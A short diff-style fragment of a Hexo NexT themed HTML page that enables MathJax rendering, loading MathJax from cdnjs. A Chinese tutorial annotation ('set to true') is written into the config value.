+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":"true                   ---------------------> 设置为true","tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-next/8.20.0/third-party/math/mathjax.min.js"></script>
+
+
+
+</body>
+</html>
